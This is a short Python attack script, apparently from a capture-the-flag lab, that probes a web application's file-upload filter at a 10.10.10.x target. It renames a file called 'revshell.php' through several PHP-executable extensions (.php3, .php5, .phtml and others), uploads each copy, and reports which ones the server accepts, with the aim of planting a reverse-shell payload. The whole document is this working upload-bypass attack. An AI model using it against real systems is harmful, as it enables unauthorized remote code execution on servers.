#!/usr/bin/env python3

import requests
import os

ip = "10.10.10.111"     #target Ip
url = f"http://{ip}:3333/internal/index.php"

old_filename = "revshell.php"

filename = "revshell"
extensions = [
        ".php",
        ".php3",
        ".php4",
        ".php5",
        ".phtml",
]

for ext in extensions:
        #file = os.path.join(filename, ext)
        #print(file) This is in order to verify the extensions

        new_filename = filename + ext
        os.rename(old_filename, new_filename)

        files = {"file": open(new_filename, "rb")}
        r = requests.post(url, files=files)

        print(r.text)
        #break
        if "Extensions not allowed" in r.text:
                print(f"{ext} not allowed")
        else:
                print(f"{ext} permitted..")

        old_filename = new_filename
